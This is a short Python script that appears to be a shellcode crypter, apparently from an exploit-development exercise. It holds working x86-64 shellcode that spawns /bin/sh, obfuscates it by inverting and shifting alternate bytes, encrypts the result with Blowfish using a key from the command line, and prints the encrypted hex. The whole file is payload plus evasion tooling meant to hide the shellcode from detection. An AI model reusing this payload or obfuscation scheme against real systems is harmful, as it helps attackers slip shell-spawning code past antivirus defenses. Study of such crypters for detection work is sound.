#!/usr/bin/python

from Crypto.Cipher import Blowfish
from Crypto import Random
from struct import pack
import random
import sys
shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")

encoded = ""
shift = 13

print 'Encoded shellcode ...'
index = 0

for x in bytearray(shellcode) :
	if (index%2==0):
		y = ~x
	        encoded += '\\x'
        	encoded += '%02x' % (y & 0xff)
	if (index%2!=0):
		byte = (x+ shift)%256
		encoded += '\\x'
                encoded += '%02x' % byte
	index += 1


bs = Blowfish.block_size
key = b'%s'%sys.argv[1]
iv = Random.new().read(bs)
cipher = Blowfish.new(key, Blowfish.MODE_CBC, iv)
plaintext = encoded
plen = bs - len(plaintext) % bs
padding = [plen]*plen
padding = pack('b'*plen, *padding)
enc = iv + cipher.encrypt(plaintext + padding)
encrypt = ""

for x in bytearray(enc):
  encrypt += '\\x'
  enc = '%02x' % x
  encrypt += enc  
 
print encrypt
